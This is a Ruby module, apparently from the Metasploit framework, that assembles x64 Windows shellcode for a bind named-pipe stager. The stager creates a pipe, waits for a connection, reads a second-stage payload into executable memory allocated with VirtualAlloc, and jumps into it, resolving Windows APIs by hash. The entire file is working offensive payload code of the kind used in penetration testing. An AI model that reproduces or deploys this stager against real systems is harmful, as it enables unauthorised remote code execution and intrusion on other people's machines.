# -*- coding: binary -*-

require 'msf/core'
require 'msf/core/payload/transport_config'
require 'msf/core/payload/windows/x64/send_uuid'
require 'msf/core/payload/windows/x64/block_api'
require 'msf/core/payload/windows/x64/exitfunk'

module Msf

###
#
# bind_named_pipe payload generation for Windows ARCH_X86_64
#
###
module Payload::Windows::BindNamedPipe_x64

  include Msf::Payload::TransportConfig
  include Msf::Payload::Windows
  include Msf::Payload::Windows::SendUUID_x64
  include Msf::Payload::Windows::BlockApi_x64
  include Msf::Payload::Windows::Exitfunk_x64

  #
  # Register bind_named_pipe specific options
  #
  def initialize(*args)
    super
    register_advanced_options(
      [
        OptInt.new('WAIT_TIMEOUT', [false, 'Seconds pipe will wait for a connection', 10])
      ]
    )
  end

  #
  # Generate the first stage
  #
  def generate
    conf = {
      name:        datastore['PIPENAME'],
      host:        datastore['PIPEHOST'],
      timeout:     datastore['WAIT_TIMEOUT'],
      reliable:    false,
    }

    # Generate the advanced stager if we have space
    unless self.available_space.nil? || required_space > self.available_space
      conf[:reliable] = true
      conf[:exitfunk] = datastore['EXITFUNC']
    end

    generate_bind_named_pipe(conf)
  end

  #
  # By default, we don't want to send the UUID, but we'll send
  # for certain payloads if requested.
  #
  def include_send_uuid
    false
  end

  #
  # Generate and compile the stager
  #
  def generate_bind_named_pipe(opts={})
    combined_asm = %Q^
      cld                     ; Clear the direction flag.
      and rsp, ~0xF           ; Ensure RSP is 16 byte aligned 
      call start              ; Call start, this pushes the address of 'api_call' onto the stack.
      #{asm_block_api}
      start:
        pop rbp               ; block API pointer
      #{asm_bind_named_pipe(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X64.new, combined_asm).encode_string
  end

  def transport_config(opts={})
    transport_config_bind_named_pipe(opts)
  end

  #
  # Determine the maximum amount of space required for the features requested
  #
  def required_space
    # Start with our cached default generated size
    space = cached_size

    # EXITFUNK processing adds 31 bytes at most (for ExitThread, only ~16 for others)
    space += 31

    # Reliability adds bytes! +81 if exitfunk, otherwise +119
    #space += 81
    space += 119

    space += uuid_required_size if include_send_uuid

    # The final estimated size
    space
  end

  def uuid_required_size
    # TODO update this
    space = 0

    # UUID size
    space += 16
  end

  #
  # hPipe must be in rdi. rax will contain WriteFile return value
  # 
  def asm_send_uuid(uuid=nil)
    uuid ||= generate_payload_uuid
    uuid_raw = uuid.to_raw

    asm << %Q^
      send_uuid:
        mov rcx, rdi               ; hPipe
        call get_uuid_address      ; put uuid buffer on the stack
        db #{raw_to_db(uuid_raw)}
      get_uuid_address:
        pop rdx                    ; lpBuffer
        push #{uuid_raw.length}
        pop r8                     ; nNumberOfBytesToWrite
        sub rsp, 16                ; allocate + alignment
        mov r9, rsp                ; lpNumberOfBytesWritten
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'WriteFile')}
        call rbp                   ; WriteFile(hPipe, lpBuffer, nNumberOfBytesToWrite, lpNumberOfBytesWritten)
        add rsp, 16
    ^
  end

  #
  # Generate an assembly stub with the configured feature set and options.
  #
  # @option opts [String]  :exitfunk The exit method to use if there is an error, one of process, thread, or seh
  # @option opts [Bool]    :reliable Whether or not to enable error handling code
  # @option opts [String]  :name Pipe name to create
  # @option opts [Int]     :timeout Seconds to wait for pipe connection
  #
  def asm_bind_named_pipe(opts={})

    reliable       = opts[:reliable]
    timeout        = opts[:timeout] * 1000 # convert to millisecs
    retry_wait     = 500
    retry_count    = timeout / retry_wait
    full_pipe_name = "\\\\\\\\.\\\\pipe\\\\#{opts[:name]}"  # double escape -> \\.\pipe\name
    chunk_size     = 0x10000    # pipe buffer size
    cleanup_funk   = reliable ? 'cleanup_file' : 'failure'
    pipe_mode      = 1          # (PIPE_TYPE_BYTE|PIPE_NOWAIT|PIPE_READMODE_BYTE)

    asm = %Q^
      create_named_pipe:
        call get_pipe_name
        db "#{full_pipe_name}", 0x00
      get_pipe_name:
        pop rcx                 ; lpName
        mov rdx, 3              ; dwOpenMode (PIPE_ACCESS_DUPLEX)
        mov r8, #{pipe_mode}    ; dwPipeMode
        mov r9, 255             ; nMaxInstances (PIPE_UNLIMITED_INSTANCES). in case pipe isn't released
        push 0                  ; lpSecurityAttributes. Default r/w for creator and administrators
        push 0                  ; nDefaultTimeOut
        push #{chunk_size}      ; nInBufferSize
        push #{chunk_size}      ; nOutBufferSize
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CreateNamedPipeA')}
        call rbp                ; CreateNamedPipeA
        mov rdi, rax            ; save hPipe (using sockrdi convention)

      ; check for failure
        cmp rax, -1             ; did it work? (INVALID_HANDLE_VALUE)
        jz failure

      ; initialize retry counter
        push #{retry_count}     ; retry counter
        pop r14

      ; Connect pipe to remote
      connect_pipe:
        mov rcx, rdi            ; hPipe
        xor rdx, rdx            ; lpOverlapped
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ConnectNamedPipe')}
        call rbp                ; ConnectNamedPipe

      ; check for failure
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetLastError')}
        call rbp                ; GetLastError
        cmp rax, 0x217          ; looking for ERROR_PIPE_CONNECTED
        jz get_stage_size       ; success
        dec r14
        jz #{cleanup_funk}      ; out of retries

      ; wait before trying again
        mov rcx, #{retry_wait}
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'Sleep')}
        call rbp                ; Sleep
        jmp connect_pipe
      ^

    asm << asm_send_uuid if include_send_uuid

    asm << 'get_stage_size:'

    # For reliability, set pipe state to wait so ReadFile blocks
    if reliable
      asm << %Q^
        mov rcx, rdi            ; hPipe
        push 0                  ; alignment
        push 0
        mov rdx, rsp            ; lpMode (PIPE_WAIT)
        xor r8, r8              ; lpMaxCollectionCount
        xor r9, r9              ; lpCollectDataTimeout
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'SetNamedPipeHandleState')}
        call rbp
      ^
    end

    asm << %Q^
      ; read size of second stage
        mov rcx, rdi            ; hPipe
        push 0                  ; 
        mov rdx, rsp            ; lpBuffer
        mov r8, 4               ; nNumberOfBytesToRead
        push 0
        mov r9, rsp             ; lpNumberOfBytesRead
        push 0                  ; alignment
        push 0                  ; lpOverlapped
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call rbp                ; ReadFile
        add rsp, 0x30           ; adjust stack
        pop rsi                 ; lpNumberOfBytesRead
      ^

    if reliable
      asm << %Q^
      ; check for bytesRead == 4
        cmp rsi, 4              ; expecting 4 bytes
        jnz cleanup_file
      ^
    end

    asm << %Q^
      get_second_stage:
      ; Alloc a RWX buffer for the second stage
        pop rsi                 ; pop off the second stage length
        mov esi, esi            ; only use the lower-order 32 bits for the size
        push 0x40               ; 
        pop r9                  ; PAGE_EXECUTE_READWRITE
        push 0x1000             ; 
        pop r8                  ; MEM_COMMIT
        mov rdx, rsi            ; the newly recieved second stage length.
        xor rcx, rcx            ; NULL as we dont care where the allocation is.
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualAlloc')}
        call rbp                ; VirtualAlloc( NULL, dwLength, MEM_COMMIT, PAGE_EXECUTE_READWRITE );
      ; Receive the second stage and execute it...
      ^

    if reliable
      asm << %Q^
        test rax, rax           ; VirtualAlloc returning 0 is an error
        jz cleanup_file
      ^
    end

    asm << %Q^
        mov rbx, rax            ; rbx = stage 2 address
        mov r15, rax            ; save the address so we can jump into it later

      read_more:
        ; prepare the size min(0x10000, esi)
        mov r8, #{chunk_size}
        cmp r8, rsi
        jle read_max            ; read chunk_size
        mov r8, rsi
      read_max:

        push 0                  ; buffer for lpNumberOfBytesRead
        mov r9, rsp             ; lpNumberOfBytesRead
        mov rdx, rbx            ; lpBuffer
        push 0                  ; lpOverlapped
        mov rcx, rdi            ; hPipe
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'ReadFile')}
        call rbp                ; ReadFile(hPipe, lpBuffer, nNumberOfBytesToRead, lpNumberOfBytesRead, lpOverlapped)
        add rsp, 0x28           ; slight stack adjustment
        pop rdx                 ; lpNumberOfBytesRead
    ^

    if reliable
      asm << %Q^
      ; check to see if the read worked
        test rax, rax
        jnz read_successful

      ; something failed so free up memory
        push r15
        pop rcx                 ; lpAddress
        push 0x8000             ; MEM_RELEASE
        pop r8                  ; dwFreeType
        push 0                  ; 0 to decommit whole block
        pop rdx                 ; dwSize
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'VirtualFree')}
        call rbp                ; VirtualFree(payload, 0, MEM_RELEASE)

      cleanup_file:
      ; clean up the pipe handle
        push rdi                ; file handle
        pop rcx                 ; hFile
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'CloseHandle')}
        call rbp                ; CloseHandle(hPipe)

        jmp failure
      ^
    end

    asm << %Q^
      read_successful:
        add rbx, rdx            ; buffer += bytes_received
        sub rsi, rdx            ; length -= bytes_received
        test rsi, rsi           ; check for 0 bytes left
        jnz read_more           ; continue if we have more to read

        jmp r15                 ; jump into the second stage
    ^

    asm << 'failure:'

    if opts[:exitfunk]
      asm << %Q^
        and rsp, ~0xf           ; Ensure RSP is 16 byte aligned
        call exitfunk
      ^
      asm << asm_exitfunk(opts)
    elsif reliable
      asm << %Q^
        and rsp, ~0xf           ; Ensure RSP is 16 byte aligned
        call get_kernel32_name
        db "kernel32", 0x00
      get_kernel32_name:
        pop rcx                 ; 
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetModuleHandleA')}
        call rbp                ; GetModuleHandleA("kernel32")

        call get_exit_name
        db "ExitThread", 0x00
      get_exit_name:
        mov rcx, rax            ; hModule
        pop rdx                 ; lpProcName
        mov r10d, #{Rex::Text.block_api_hash('kernel32.dll', 'GetProcAddress')}
        call rbp                ; GetProcAddress(hModule, "ExitThread")
        xor rcx, rcx            ; dwExitCode
        call rax                ; ExitProcess(0)
      ^
    else
      # run off the end
    end

    asm
  end

end

end
